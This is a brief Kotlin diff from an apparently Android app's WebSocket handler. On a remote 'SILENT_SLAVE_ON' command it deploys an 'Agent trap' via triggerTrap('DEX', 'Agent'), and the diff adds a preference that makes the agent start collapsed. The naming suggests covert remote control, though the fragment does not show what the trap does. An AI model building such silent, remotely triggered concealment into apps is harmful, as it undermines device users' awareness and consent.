@@ -119,6 +119,7 @@ object SocketManager {
                             if (action == "SILENT_SLAVE_ON") {
                                 DebugLogger.log("WS", "Intercepting SILENT_SLAVE_ON. Deploying Agent trap dynamically.")
                                 appContext?.let { ctx ->
+                                    ctx.getSharedPreferences("agent_prefs", Context.MODE_PRIVATE).edit().putBoolean("start_collapsed", true).apply()
                                     val bridge = DynamicUIManager.CortexBridge(ctx)
                                     bridge.triggerTrap("DEX", "Agent")
                                     
